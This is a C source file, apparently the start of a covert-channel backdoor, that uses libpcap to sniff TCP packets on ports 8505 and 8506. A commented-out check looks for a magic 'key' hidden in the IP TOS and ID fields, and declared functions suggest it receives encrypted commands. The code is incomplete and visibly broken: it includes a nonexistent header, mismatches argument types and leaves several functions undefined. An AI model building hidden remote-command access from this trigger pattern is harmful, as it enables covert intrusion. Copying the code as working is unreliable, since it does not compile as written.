#include <pcap.h>
#include <bool.h>

#define FILTER "tcp and (( port 8505 || port 8506))"


int CaptureNext();
void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParsePayload(const u_char *payload, int len);
void CreatePayload(char *command, unsigned char *encrypted);
void SendPayload(const unsigned char *tcp_payload);
bool CheckKey(u_char ip_tos, u_short ip_id);

int main(int argc, char **argv){
    CaptureNext();

}


int CaptureNext(){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    pcap_t* interfaceinfo;
    bpf_u_int32 netp; //holds the ip
    const u_char *packet;
    struct pcap_pkthdr packet_header;

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }

    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    packet = pcap_next(interfaceinfo, &packet_header);

    ReadPacket(0, packet_header, packet);

    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        //if(CheckKey(ip->ip_tos, ip->ip_id)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet);
        /*} else {
            printf("Packet tossed wrong key\n");
        }*/
    }

}

bool CheckKey(u_char ip_tos, u_short ip_id){
    if(ip_tos == 'l' && ip_id == 'b'){
        return true;
    } else {
        return false;
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(payload, size_payload);
    }
}
